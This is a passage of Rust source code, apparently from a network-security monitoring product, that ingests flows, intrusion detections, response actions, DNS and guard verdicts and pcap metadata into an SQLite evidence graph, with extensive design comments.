        // process's transaction landing mid-commit on the other's would fail immediately with
        // `SQLITE_BUSY` instead of just waiting a moment; 5 s comfortably covers this crate's own
        // largest batch commit (`commit()`'s one-transaction-per-timer-pass).
        conn.execute_batch("PRAGMA journal_mode=TRUNCATE; PRAGMA synchronous=NORMAL; PRAGMA foreign_keys=OFF; PRAGMA busy_timeout=5000;")
            .context("set pragmas")?;
        conn.execute_batch(SCHEMA).context("init schema")?;
        migrate_additive_columns(&conn).context("additive schema migration")?;
        migrate_values(&conn)?;
        Ok(Self { conn })
    }
    pub fn open_memory() -> Result<Self> {
        let conn = Connection::open_in_memory().context("sqlite :memory:")?;
        conn.execute_batch("PRAGMA synchronous=NORMAL;").ok();
        conn.execute_batch(SCHEMA).context("init schema")?;
        Ok(Self { conn })
    }

    /// Open the SAME `evidence.db` strictly READ-ONLY (Mission Control read-API, ADR 0013 D4a's
    /// sibling for the HTTP surface). Uses SQLite's own `SQLITE_OPEN_READ_ONLY` open flag — not just
    /// "a connection this crate promises not to write through" — so the OS-level file open itself
    /// cannot take a write lock, and every INSERT/UPDATE/DDL this crate's writer methods issue would
    /// fail with `SQLITE_READONLY` if ever (mistakenly) called on it. This is the hard guarantee the
    /// read-API needs: it must NEVER contend with or corrupt the `hookprobe-evidence.timer` writer
    /// service, which is why it does NOT run `SCHEMA`/pragma writes here (the schema already exists —
    /// created by the writer's `open()` — and a read-only handle couldn't create it anyway).
    /// `PRAGMA query_only=ON` is redundant defense-in-depth (the open flag alone already blocks
    /// writes at the OS/VFS layer) — cheap, so no reason not to add the second layer.
    pub fn open_readonly(path: &Path) -> Result<Self> {
        let flags = rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY
            | rusqlite::OpenFlags::SQLITE_OPEN_NO_MUTEX
            | rusqlite::OpenFlags::SQLITE_OPEN_URI;
        let conn = Connection::open_with_flags(path, flags)
            .with_context(|| format!("open sqlite read-only: {}", path.display()))?;
        conn.execute_batch("PRAGMA query_only=ON;")
            .context("set query_only pragma")?;
        Ok(Self { conn })
    }

    /// Batch many ingest calls into one transaction — the big win on slow storage (one fsync, not
    /// thousands). Pair `begin()` before an ingest loop with `commit()` after.
    pub fn begin(&self) -> Result<()> {
        self.conn.execute_batch("BEGIN").context("begin txn")?;
        Ok(())
    }
    pub fn commit(&self) -> Result<()> {
        self.conn.execute_batch("COMMIT").context("commit txn")?;
        Ok(())
    }

    fn add_edge(&self, src: &str, ty: &str, dst: &str, ts: f64) -> Result<()> {
        self.conn.execute(
            "INSERT INTO edges VALUES (?,?,?,?) ON CONFLICT DO NOTHING",
            params![src, ty, dst, ts])?;
        Ok(())
    }

    /// Ingest one flow JSON line → a `flows` node + a `devices` node + a `flow_from_device` edge,
    /// PLUS the three drill-down pivots MissionControl.md's evidence chain names between
    /// Connection and Threat (`Interface`/`Application`/`Session` — see each block below for the
    /// honesty rule it follows). Returns the flow node id (None for a non-flow line).
    pub fn ingest_flow(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) { Ok(v) => v, Err(_) => return Ok(None) };
        let src_ip = v["src_ip"].as_str().unwrap_or("");
        if src_ip.is_empty() { return Ok(None); }
        let ts = v["ts"].as_f64().unwrap_or(0.0);
        let src_port = v["src_port"].as_i64().unwrap_or(0);
        let dst_ip = v["dst_ip"].as_str().unwrap_or("");
        let dst_port = v["dst_port"].as_i64().unwrap_or(0);
        let proto = v["proto"].as_str().unwrap_or("");
        let cs = v["conn_state"].as_str().unwrap_or("");
        let ob = v["orig_bytes"].as_i64().unwrap_or(0);
        let rb = v["resp_bytes"].as_i64().unwrap_or(0);
        let tswin = (ts as i64) / 60; // 60s flow window
        let flow_id = sid("flow", &format!("{src_ip}:{src_port}>{dst_ip}:{dst_port}/{proto}@{tswin}"));
        let dev_id = sid("dev", src_ip);
        self.conn.execute(
            "INSERT INTO devices (id,ip,first_seen,last_seen) VALUES (?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET last_seen=max(devices.last_seen, excluded.last_seen), first_seen=min(devices.first_seen, excluded.first_seen)",
            params![dev_id, src_ip, ts, ts])?;
        self.conn.execute(
            "INSERT INTO flows VALUES (?,?,?,?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
            params![flow_id, ts, src_ip, src_port, dst_ip, dst_port, proto, cs, ob, rb])?;
        self.add_edge(&flow_id, "flow_from_device", &dev_id, ts)?;

        // ---- Interface (S2/S3 drill-down pivot): LAN/WAN ROLE the flow's source crossed, via the
        // SAME canonical `classify_source` predicate the scan-responder/aegis-guard enforcement
        // paths already share — reused, never reimplemented, so this can never silently drift from
        // what the enforcement path itself believes is LAN vs WAN. No producer in this codebase
        // emits a literal per-NIC interface name (`senzorium-flow-export.sh`/`napse-dpi` carry no
        // `iface` field today) — rather than fabricate one, this attributes the one honest signal
        // actually available (a future producer that starts emitting a real `iface` field should be
        // preferred here over this fallback; none exists yet, so nothing to prefer today, flagged
        // not built). Only 2 rows ever exist (`iface:lan`/`iface:wan`).
        let role = hookprobe_mgmt_guard::classify_source(src_ip);
        let iface_id = format!("iface:{}", role.as_str());
        let iface_label = match role {
            hookprobe_mgmt_guard::SourceKind::Lan => "LAN (RFC1918 / link-local / CGNAT-shared / loopback)",
            hookprobe_mgmt_guard::SourceKind::Wan => "WAN (public internet)",
        };
        self.conn.execute(
            "INSERT INTO interfaces (id,role,label) VALUES (?,?,?) ON CONFLICT (id) DO NOTHING",
            params![iface_id, role.as_str(), iface_label])?;
        self.add_edge(&flow_id, "flow_on_interface", &iface_id, ts)?;

        // ---- Application (S2/S3 drill-down pivot): derive from whatever application-identifying
        // signal THIS flow record actually carries. `napse_loader::dpi`'s dns/tls/http records emit
        // `service`/`tls_sni`/`http_host`/`ja3`; `senzorium-flow-export.sh`'s plain `conn` records
        // emit none of these, so they fall back to the bare destination port — still a real,
        // non-fabricated signal ("the application server this port serves"), never invented.
        // Preference order (most to least specific): HTTP Host > TLS SNI > declared `service`
        // (+dst_port, so "dns:53"/"tls:443" stay distinct keys per port) > bare dst_port.
        let http_host = v["http_host"].as_str().unwrap_or("");
        let tls_sni = v["tls_sni"].as_str().unwrap_or("");
        let service = v["service"].as_str().unwrap_or("");
        let ja3 = v["ja3"].as_str().unwrap_or("");
        // JA4+ suite (2026-07-09, detection-surface expansion): `ja4` rides the SAME ClientHello
        // record as `ja3`/`tls_sni`; `ja4h` the SAME HTTP-request record as `http_host`; `ja4s`
        // rides its OWN ServerHello record (no sni/http_host of its own — see
        // `napse_loader::dpi::parse_tls_server_hello`'s doc comment for the honest scope note on
        // why it may land in a different `applications` bucket than its connection's `ja3`/`ja4`).
        let ja4 = v["ja4"].as_str().unwrap_or("");
        let ja4s = v["ja4s"].as_str().unwrap_or("");
        let ja4h = v["ja4h"].as_str().unwrap_or("");
        let app_key = if !http_host.is_empty() {
            format!("http:{http_host}")
        } else if !tls_sni.is_empty() {
            format!("tls:{tls_sni}")
        } else if !service.is_empty() {
            format!("{service}:{dst_port}")
        } else if dst_port != 0 {
            format!("port:{dst_port}")
        } else {
            String::new()
        };
        if !app_key.is_empty() {
            let app_id = sid("app", &app_key);
            self.conn.execute(
                "INSERT INTO applications (id,service,dst_port,sni,http_host,ja3,first_seen,last_seen,ja4,ja4s,ja4h) \
                 VALUES (?,?,?,?,?,?,?,?,?,?,?) \
                 ON CONFLICT (id) DO UPDATE SET \
                   last_seen=max(applications.last_seen, excluded.last_seen), \
                   first_seen=min(applications.first_seen, excluded.first_seen), \
                   sni=CASE WHEN excluded.sni<>'' THEN excluded.sni ELSE applications.sni END, \
                   http_host=CASE WHEN excluded.http_host<>'' THEN excluded.http_host ELSE applications.http_host END, \
                   ja3=CASE WHEN excluded.ja3<>'' THEN excluded.ja3 ELSE applications.ja3 END, \
                   ja4=CASE WHEN excluded.ja4<>'' THEN excluded.ja4 ELSE applications.ja4 END, \
                   ja4s=CASE WHEN excluded.ja4s<>'' THEN excluded.ja4s ELSE applications.ja4s END, \
                   ja4h=CASE WHEN excluded.ja4h<>'' THEN excluded.ja4h ELSE applications.ja4h END",
                params![app_id, service, dst_port, tls_sni, http_host, ja3, ts, ts, ja4, ja4s, ja4h])?;
            self.add_edge(&flow_id, "flow_to_application", &app_id, ts)?;
        }

        // ---- Session (S2/S3 drill-down pivot): fold every flow between the same (src_ip,dst_ip)
        // pair within a 30-minute bucket into one logical session node. Keyed on
        // (src_ip,dst_ip,window) — NOT counted eagerly here (a `flow_count` column would double-
        // count on re-ingest of the same historical line); any consumer that needs "how many flows
        // in this session" derives it from the `flow_in_session` edge count, which the edges PK
        // already keeps idempotent. Deliberately its OWN table (`net_sessions`) + `netsess:` id
        // prefix — UNRELATED to, and never to be confused with, the ADR 0013 dev-time lifecycle
        // `sessions` table (a Claude Code prompt session), which already owns the bare `session:`
        // prefix for a completely different node kind.
        let session_window = (ts as i64) / 1800; // 30-minute buckets
        let sess_id = sid("netsess", &format!("{src_ip}>{dst_ip}@{session_window}"));
        self.conn.execute(
            "INSERT INTO net_sessions (id,src_ip,dst_ip,first_ts,last_ts) VALUES (?,?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET \
               last_ts=max(net_sessions.last_ts, excluded.last_ts), \
               first_ts=min(net_sessions.first_ts, excluded.first_ts)",
            params![sess_id, src_ip, dst_ip, ts, ts])?;
        self.add_edge(&flow_id, "flow_in_session", &sess_id, ts)?;

        Ok(Some(flow_id))
    }

    /// Ingest one detection (NAPSE alert) JSON line → a `detections` node + `detects_on_device` edge +
    /// `detection_on_flow` edges to every matching flow (same src/dst/port within the time window).
    pub fn ingest_detection(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) { Ok(v) => v, Err(_) => return Ok(None) };
        if v["rule_id"].is_null() && v["rule_msg"].is_null() { return Ok(None); } // not a detection
        let ts = v["ts"].as_f64().unwrap_or(0.0);
        let rule_id = v["rule_id"].as_i64().unwrap_or(0);
        let rule_msg = v["rule_msg"].as_str().unwrap_or("");
        let category = v["category"].as_str().unwrap_or("");
        let severity = v["severity"].as_i64().unwrap_or(0);
        let mitre = v["mitre"].as_str().unwrap_or("");
        let src_ip = v["src_ip"].as_str().unwrap_or("");
        let dst_ip = v["dst_ip"].as_str().unwrap_or("");
        let dst_port = v["dst_port"].as_i64().unwrap_or(0);
        let confidence = v["confidence"].as_f64().unwrap_or(0.0);
        let det_id = sid("det", &format!("{rule_id}:{src_ip}>{dst_ip}:{dst_port}@{ts}"));
        let dev_id = sid("dev", src_ip);
        self.conn.execute(
            "INSERT INTO detections VALUES (?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
            params![det_id, ts, rule_id, rule_msg, category, severity, mitre, src_ip, dst_ip, dst_port, confidence])?;
        // Referential-integrity fix (backend-audit gap 1, found by the prune sweep's dangling-edge
        // check): a device known ONLY via a NAPSE detection (no matching `flows` row -- e.g. its
        // handshake was RST'd before conntrack ever saw it) previously got a `detects_on_device`
        // edge to a `dev_id` that no `devices` row ever backed -- a permanently dangling edge, not
        // something pruning created. Same "sighting-only device" upsert idiom
        // `ingest_dns_verdict`/`ingest_aegis_verdict` already use, applied here too so every
        // `detects_on_device` edge target is guaranteed to exist.
        if !src_ip.is_empty() {
            self.conn.execute(
                "INSERT INTO devices (id,ip,first_seen,last_seen) VALUES (?,?,?,?) \
                 ON CONFLICT (id) DO UPDATE SET last_seen=max(devices.last_seen, excluded.last_seen), first_seen=min(devices.first_seen, excluded.first_seen)",
                params![dev_id, src_ip, ts, ts])?;
        }
        self.add_edge(&det_id, "detects_on_device", &dev_id, ts)?;
        // link to the flow(s) that triggered it: same src/dst/port within ±120s
        let mut stmt = self.conn.prepare(
            "SELECT id FROM flows WHERE src_ip=? AND dst_ip=? AND dst_port=? AND abs(ts-?)<120")?;
        let flow_ids: Vec<String> = stmt
            .query_map(params![src_ip, dst_ip, dst_port, ts], |r| r.get::<_, String>(0))?
            .filter_map(|r| r.ok())
            .collect();
        for fid in flow_ids {
            self.add_edge(&det_id, "detection_on_flow", &fid, ts)?;
        }
        // Trigger-to-evidence pcap capture (roadmap D): `napse-dpi`'s `capture` module appends a
        // SECOND events-stream line for a detection once its bounded post-trigger tail finishes
        // writing — an exact copy of the original alert JSON (same rule_id/src_ip/dst_ip/dst_port/
        // ts, so it resolves to the SAME `det_id` computed above) plus `pcap_path`/`pcap_sha256`/
        // `pcap_bytes` (see `napse_loader::capture::inject_pcap_fields`). The FIRST (immediate)
        // alert line never carries these fields — this is the ONLY place they can appear, and this
        // ingest path is the ONLY place they get wired into the graph: no separate daemon, no
        // pcap-specific timer, just the SAME `hookprobe-evidence.timer` events-file re-scan every
        // detection line already goes through.
        let pcap_path = v["pcap_path"].as_str().unwrap_or("");
        if !pcap_path.is_empty() {
            let pcap_sha256 = v["pcap_sha256"].as_str().unwrap_or("");
            let pcap_bytes = v["pcap_bytes"].as_i64().unwrap_or(0);
            // Fall back to the detection's own `ts` if a producer doesn't carry the finer
            // first/last-frame timestamps (forward/backward compat — never a hard requirement).
            let pcap_first_ts = v["pcap_first_ts"].as_f64().unwrap_or(ts);
            let pcap_last_ts = v["pcap_last_ts"].as_f64().unwrap_or(ts);
            let pcap_id = sid("pcap", pcap_path);
            self.conn.execute(
                "INSERT INTO pcaps VALUES (?,?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
                params![pcap_id, ts, pcap_path, pcap_sha256, pcap_bytes, src_ip, pcap_first_ts, pcap_last_ts],
            )?;
            self.add_edge(&det_id, EDGE_DETECTION_TO_PCAP, &pcap_id, ts)?;
        }
        self.attribute_network_detection_user(&det_id, src_ip, ts)?;
        Ok(Some(det_id))
    }

    /// Attribute a NETWORK-origin detection to a `User` node — the User drill-down pivot
    /// MissionControl.md's evidence chain names, HONESTLY populated (never fabricated). WAN-sourced
    /// traffic (`classify_source(src_ip) == Wan`) can *never* be tied to a local OS-user identity —
    /// there is no host telemetry from a remote, unauthenticated attacker to correlate against — so
    /// recording the single canonical `user:unknown` node here IS the honest, correct terminus for
    /// that evidence chain, not a stand-in for "not yet correlated".
    ///
    /// LAN-sourced detections are deliberately left UNLINKED: a LAN device's owning user CAN become
    /// knowable later (host-EDR credential telemetry — see `attribute_host_detection_user` — or a
    /// future 802.1X/DHCP-lease integration this crate does not own today), so wiring a permanent
    /// `user:unknown` edge for it would misrepresent "not yet correlated" as "structurally
    /// unknowable". This is the documented, intentional gap the task's honesty rule calls for.
    fn attribute_network_detection_user(&self, det_id: &str, src_ip: &str, ts: f64) -> Result<()> {
        if src_ip.is_empty() { return Ok(()); }
        if hookprobe_mgmt_guard::classify_source(src_ip) != hookprobe_mgmt_guard::SourceKind::Wan {
            return Ok(()); // LAN: leave unattributed rather than fabricate — see doc comment above
        }
        let user_id = "user:unknown";
        self.conn.execute(
            "INSERT INTO users (id,principal,first_seen,last_seen) VALUES (?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET last_seen=max(users.last_seen, excluded.last_seen), \
                                            first_seen=min(users.first_seen, excluded.first_seen)",
            params![user_id, "unknown", ts, ts])?;
        self.add_edge(det_id, "detection_by_user", user_id, ts)?;
        Ok(())
    }

    /// Attribute a HOST-layer detection (a real Detection-class row produced by
    /// `host_edr::classify_exec`/`classify_persistence`) to the OWNING `User`, when THIS device has
    /// EVER reported a credential event naming a principal (`ingest_host_event`'s `"credential"`
    /// case). Best-effort, most-recently-seen principal for the device — real host telemetry,
    /// never fabricated. If this device has reported NO credential telemetry yet, this
    /// intentionally adds NO edge at all (not even `user:unknown`): unlike the WAN network case
    /// above, a host-owned device's user is knowable in principle the moment credential telemetry
    /// starts flowing, so recording "unknown" here would misrepresent a temporary telemetry gap as
    /// a structural impossibility.
    fn attribute_host_detection_user(&self, det_id: &str, dev_ip: &str, ts: f64) -> Result<()> {
        let principal: Option<String> = self.conn.query_row(
            "SELECT principal FROM credentials WHERE device_ip=? AND principal<>'' ORDER BY ts DESC LIMIT 1",
            params![dev_ip], |r| r.get(0)).optional()?;
        if let Some(principal) = principal {
            let user_id = sid("user", &principal);
            self.conn.execute(
                "INSERT INTO users (id,principal,first_seen,last_seen) VALUES (?,?,?,?) \
                 ON CONFLICT (id) DO UPDATE SET last_seen=max(users.last_seen, excluded.last_seen), \
                                                first_seen=min(users.first_seen, excluded.first_seen)",
                params![user_id, principal, ts, ts])?;
            self.add_edge(det_id, "detection_by_user", &user_id, ts)?;
        }
        Ok(())
    }

    /// Ingest one AEGIS reflex response event (`/var/lib/hookprobe/responses`, JSON lines —
    /// e.g. the scan-responder's ENRICH/DROP/DOCUMENT cycle) → a `responses` node +
    /// `responded_with` edges from every detection it responded to. Links by the SAME natural
    /// key `ingest_detection` uses to find its triggering flows (rule_id/src_ip/dst_ip/dst_port,
    /// within a generous ±600s — the responder runs slightly after the alert it reacts to), so
    /// no id-generation code is shared between the supervisor and this crate. A response with no
    /// matching detection yet still ingests (unlinked, like `ingest_beacon` without a release) —
    /// the evidence timer's next pass (once the detection lands) doesn't retroactively link, but
    /// in practice `--events` is ingested before `--responses` in the same run, so this is rare.
    pub fn ingest_response(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) { Ok(v) => v, Err(_) => return Ok(None) };
        let action = v["action"].as_str().unwrap_or("");
        if action.is_empty() { return Ok(None); } // not a response line
        let ts = v["ts"].as_f64().unwrap_or(0.0);
        let rule_id = v["rule_id"].as_i64().unwrap_or(0);
        let src_ip = v["src_ip"].as_str().unwrap_or("");
        let dst_ip = v["dst_ip"].as_str().unwrap_or("");
        let dst_port = v["dst_port"].as_i64().unwrap_or(0);
        let mechanism = v["mechanism"].as_str().unwrap_or("");
        let target = v["target"].as_str().unwrap_or("");
        let detail = v["detail"].as_str().unwrap_or("");
        let ttl_secs = v["ttl_secs"].as_i64().unwrap_or(0);
        let status = v["status"].as_str().unwrap_or("");

        // Resource-shed honesty fix (PLM audit S3, 2026-07-08): unlike every OTHER responder in
        // this crate (scan quarantine, l2guard storm-control, …), a resource-shed action's
        // trigger is evaluated and decided ENTIRELY inside
        // `scan_responder::evaluate_resource_reality`/`reconcile_resource_shed` against a live
        // resource fact (conntrack fill %, PSI avg60) — there is no upstream NAPSE "alert" line
        // this response could ever line up against. Left as a headless response, it never flows
        // detection -> `correlate_all` -> incident, so a DDoS-shed is invisible on
        // Detect/Investigate — the one enforcement action a customer most needs to see. Fix:
        // synthesize ONE detection-shaped record from the exact resource-reality fact this
        // response itself carries (never fabricated — same fields `render_shed_response_json`
        // already puts in `detail`), BEFORE the normal insert/link logic below, so the EXISTING
        // rule_id/src_ip/dst_ip/dst_port/ts match (unchanged) wires the `responded_with` edge
        // exactly like every other responder — no special-cased linking needed.
        //
        // Deliberately NOT done for `resource_shed_revert`: the revert documents the SAME entry
        // clearing, not a new event to investigate (a revert with its own detection would
        // double-count one shed as two incidents/detections for the same source).
        //
        // Honesty, by construction: severity is pinned LOW (1, never the 2+ that flips
        // `correlate_incident`'s priority to "High") and `mitre` is T1498 (Network Denial of
        // Service, the DESCRIPTIVE category — a real resource-exhaustion pattern) — never a
        // malicious-identity verdict like the port-scan/quarantine path's T1046. `rule_msg`
        // states plainly that this is a resource-reality throttle that self-reverts, matching
        // `ShedEntry`'s own "carries no offense history" doc in `scan_responder.rs` — a shed is
        // "this source was throttled because the box was under real resource pressure", never
        // "this IP is malicious".
        if action == "resource_shed" && rule_id == RESOURCE_SHED_RULE_ID && !src_ip.is_empty() {
            let signal = v["signal"].as_str().unwrap_or("resource_pressure");
            let det = serde_json::json!({
                "ts": ts,
                "rule_id": rule_id,
                "rule_msg": format!(
                    "AEGIS resource-shed: temporary per-source cap under real resource pressure ({signal}) — self-reverting, resource-reality-keyed, not an identity/malicious verdict"
                ),
                "category": "resource_shed",
                "severity": 1,
                "mitre": "T1498",
                "src_ip": src_ip,
                "dst_ip": "",
                "dst_port": 0,
                "confidence": 1.0,
            });
            self.ingest_detection(&det.to_string())?;
        }

        let resp_id = sid("resp", &format!("{src_ip}:{action}@{ts}"));
        self.conn.execute(
            "INSERT INTO responses VALUES (?,?,?,?,?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET status=excluded.status, detail=excluded.detail",
            params![resp_id, ts, action, target, mechanism, detail, ttl_secs, status])?;
        if !src_ip.is_empty() {
            let mut stmt = self.conn.prepare(
                "SELECT id FROM detections WHERE rule_id=? AND src_ip=? AND dst_ip=? AND dst_port=? AND abs(ts-?)<600")?;
            let det_ids: Vec<String> = stmt
                .query_map(params![rule_id, src_ip, dst_ip, dst_port, ts], |r| r.get::<_, String>(0))?
                .filter_map(|r| r.ok())
                .collect();
            for did in det_ids {
                self.add_edge(&did, "responded_with", &resp_id, ts)?;
            }
        }
        Ok(Some(resp_id))
    }

    /// Ingest one line of the heqk M6 export stream — the JSON Lines `kernel/responder-sim`
    /// (the MSSP receiver) writes from authenticated, loss-accounted export frames:
    ///   * `heqk_detection` → a Detection node (rule id in `HEQK_RULE_BAND`, canonical severity
    ///     from the heqk catalogue, linked to the subject device by `src_ip`) + its provenance
    ///     row (sensor fingerprint, tenant, boot/sequence, tri-state class);
    ///   * `heqk_frame` → the sensor's per-boot loss accounting (upserted).
    /// The detection id is `(sensor_fp, boots, ev_seq)`, so re-ingesting a file is idempotent.
    pub fn ingest_heqk_export(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) { Ok(v) => v, Err(_) => return Ok(None) };
        let fp = v["device_fp"].as_str().unwrap_or("");
        if fp.len() != 64 || !fp.bytes().all(|b| b.is_ascii_hexdigit()) {
            return Ok(None); // not a heqk export line (or a forged/garbled sensor id)
        }
        let tenant = v["tenant"].as_u64().map(|t| format!("{t:#x}")).unwrap_or_default();
        let boots = v["boots"].as_i64().unwrap_or(0);
        let ts = v["ts"].as_f64().unwrap_or_else(now_ts);
        match v["type"].as_str() {
            Some("heqk_detection") => {
                let Some(rule) = v["rule_id"].as_i64() else { return Ok(None) };
                let ev_seq = v["ev_seq"].as_i64().unwrap_or(0);
                let src_ip = v["src_ip"].as_str().unwrap_or("");
                let class = v["class"].as_str().unwrap_or("unknown");
                let verdict = v["verdict"].as_str().unwrap_or("");
                let (msg, category, mitre, severity) = heqk_rule(rule);
                let confidence = match class {
                    "quarantine" | "framedrop" | "ratelimit_enforced" => 0.9,
                    "ratelimit" => 0.7,
                    "observe" => 0.6,
                    "allowlisted" => 0.3,
                    _ => 0.5,
                };
                let det_id = sid("heqk", &format!("{fp}:{boots}:{ev_seq}"));
                let rule_msg = format!("heqk: {msg} ({verdict}, {class})");
                self.conn.execute(
                    "INSERT INTO detections VALUES (?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
                    params![det_id, ts, HEQK_RULE_BAND + rule, rule_msg, category, severity, mitre, src_ip, "", 0i64, confidence])?;
                self.conn.execute(
                    "INSERT INTO heqk_detection_meta VALUES (?,?,?,?,?,?,?,?,?) ON CONFLICT (det_id) DO NOTHING",
                    params![det_id, fp, tenant, boots, ev_seq, verdict, class,
                        v["sev_points"].as_i64().unwrap_or(0), v["src_mac_hash"].as_str().unwrap_or("")])?;
                if !src_ip.is_empty() {
                    let dev_id = sid("dev", src_ip);
                    self.conn.execute(
                        "INSERT INTO devices (id,ip,first_seen,last_seen) VALUES (?,?,?,?) \
                         ON CONFLICT (id) DO UPDATE SET last_seen=max(devices.last_seen, excluded.last_seen), first_seen=min(devices.first_seen, excluded.first_seen)",
                        params![dev_id, src_ip, ts, ts])?;
                    self.add_edge(&det_id, "detects_on_device", &dev_id, ts)?;
                }
                Ok(Some(det_id))
            }
            Some("heqk_frame") => {
                self.conn.execute(
                    "INSERT INTO heqk_sensor_loss VALUES (?,?,?,?,1,?,?,?,?,?) \
                     ON CONFLICT (sensor_fp, boots) DO UPDATE SET last_ts=max(last_ts, excluded.last_ts), \
                     frames=frames+1, gap_events=max(gap_events, excluded.gap_events), \
                     late_events=max(late_events, excluded.late_events), device_lost=max(device_lost, excluded.device_lost), \
                     device_overruns=max(device_overruns, excluded.device_overruns), qsecbit=excluded.qsecbit",
                    params![fp, boots, tenant, ts, v["gap_events"].as_i64().unwrap_or(0), v["late_events"].as_i64().unwrap_or(0),
                        v["device_lost"].as_i64().unwrap_or(0), v["device_overruns"].as_i64().unwrap_or(0),
                        v["qsecbit"].as_i64().unwrap_or(0)])?;
                Ok(Some(format!("heqk-frame:{fp}:{boots}")))
            }
            _ => Ok(None),
        }
    }

    /// Ingest one dnsxai verdict line (`/var/lib/hookprobe/dns-verdicts`, JSON — see
    /// `modules/dnsxai/src/main.rs`'s doc comment for the exact shape:
    /// `{"domain","score","verdict","reasons"}`, optionally now carrying `"src_ip"` — the requesting
    /// device, EDR-audit finding #10) → a `detections` node (Detection-class, F-B6).
    /// Only `suspicious`/`malicious` verdicts ingest — `benign` is the overwhelming majority of
    /// DNS traffic and carries zero investigative value, so skipping it keeps the graph's signal
    /// dense instead of drowning it (same "don't ingest routine noise" call `ingest_aegis_verdict`
    /// makes for `OBSERVE`/`AutoApply`).
    ///
    /// **`src_ip` / `detects_on_device` (EDR #10, fixed):** historically the feed script that
    /// produced dnsxai's input (`base/scripts/dnsxai-feed.sh`) stripped every field except the query
    /// name, so there was no requesting device to link — this node got NO `detects_on_device` edge,
    /// unlike every other ingest path in this crate. Now: when the verdict line carries a non-empty
    /// `"src_ip"`, this both (a) stores it as the detection's own `src_ip` column — exactly the
    /// convention every other detection uses, so `correlate_all`/`correlate_incident` (which group
    /// `detections` by `src_ip` with no per-source-type branching) automatically fold a DGA/DNS
    /// finding into the SAME per-device incident as a network or host finding — and (b) upserts a
    /// `devices` row for it (a device seen only via DNS query, never a flow, still gets a node — the
    /// same "sighting-only device" gap-fix `ingest_host_event`/`ingest_aegis_verdict` already use)
    /// and adds the `detects_on_device` edge. **Graceful degradation:** if `src_ip` is absent (an
    /// old feed that hasn't been updated yet), this ingests exactly as before — `src_ip` column
    /// stays `""`, no device node, no edge — never a hard failure on the older contract.
    /// `id` is deterministic over content (domain+verdict+score), not the ingest-time wall clock, so
    /// re-reading the same historical line twice stays idempotent.
    pub fn ingest_dns_verdict(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) { Ok(v) => v, Err(_) => return Ok(None) };
        let domain = v["domain"].as_str().unwrap_or("");
        let verdict = v["verdict"].as_str().unwrap_or("");
        if domain.is_empty() || verdict.is_empty() { return Ok(None); } // not a dnsxai verdict line
        if verdict == "benign" { return Ok(None); } // no evidence value; see doc comment
        let score = v["score"].as_f64().unwrap_or(0.0);
        let reasons: String = v["reasons"].as_array()
            .map(|a| a.iter().filter_map(|r| r.as_str()).collect::<Vec<_>>().join("; "))
            .unwrap_or_default();
        // Canonical scale, 1=CRITICAL … 5=INFO (Suricata; napse/host-EDR/UI agree).
        let severity: i64 = if verdict == "malicious" { SEV_HIGH } else { SEV_MEDIUM };
        let rule_msg = if reasons.is_empty() {
            format!("dnsXai DNS anomaly: {domain} ({verdict})")
        } else {
            format!("dnsXai DNS anomaly: {domain} ({verdict}) — {reasons}")
        };
        let ts = now_ts();
        let src_ip = v["src_ip"].as_str().unwrap_or("");
        let det_id = sid("dns", &format!("{domain}:{verdict}:{score:.4}"));
        self.conn.execute(
            "INSERT INTO detections VALUES (?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
            params![det_id, ts, 0i64, rule_msg, "dns_dga", severity, "T1568.002", src_ip, domain, 53i64, score])?;
        if !src_ip.is_empty() {
            let dev_id = sid("dev", src_ip);
            self.conn.execute(
                "INSERT INTO devices (id,ip,first_seen,last_seen) VALUES (?,?,?,?) \
                 ON CONFLICT (id) DO UPDATE SET last_seen=max(devices.last_seen, excluded.last_seen), first_seen=min(devices.first_seen, excluded.first_seen)",
                params![dev_id, src_ip, ts, ts])?;
            self.add_edge(&det_id, "detects_on_device", &dev_id, ts)?;
        }
        Ok(Some(det_id))
    }

    /// Ingest one AEGIS Guard verdict line (`/var/lib/hookprobe/aegis-verdicts`, JSON — see
    /// `modules/aegis-guard/src/main.rs`'s doc comment for the two shapes) → a `detections` node
    /// (Detection-class, F-B6). Dispatches on `mode` exactly like the module's own `main.rs`:
    /// - `"reflex"` (`{"mode","ip","score","level","response","jitter_ms","reason"}`): only
    ///   `JITTER`/`SHADOW`/`DISCONNECT` ingest — `OBSERVE` is healthy baseline monitoring, not
    ///   evidence. Links `detects_on_device` to the source `ip` (upserting a `devices` row for it,
    ///   mirroring `ingest_host_event`'s "a device-only sighting still gets a node" gap-fix — a
    ///   device seen ONLY via reflex escalation, never a network flow, must still exist as a node).
    /// - `"guard"` (`{"mode","action","verdict","reason","principle"?}`): only
    ///   `RequireApproval`/`Deny` ingest — `AutoApply` is the routine, no-operator-involvement path.
    ///   No device is named in this shape (it is a policy decision, not a per-device event), so no
    ///   device edge is created — same documented gap shape as `ingest_dns_verdict`.
    ///
    /// `id` is deterministic over content, not the ingest-time wall clock (neither shape's JSON
    /// carries its own timestamp — see the module's doc comment), so re-reading the same
    /// historical line twice on the next timer pass stays idempotent.
    pub fn ingest_aegis_verdict(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) { Ok(v) => v, Err(_) => return Ok(None) };
        let ts = now_ts();
        match v["mode"].as_str().unwrap_or("") {
            "reflex" => {
                let ip = v["ip"].as_str().unwrap_or("");
                let level = v["level"].as_str().unwrap_or("");
                if ip.is_empty() || level.is_empty() || level == "OBSERVE" { return Ok(None); }
                let score = v["score"].as_f64().unwrap_or(0.0);
                let response = v["response"].as_str().unwrap_or("");
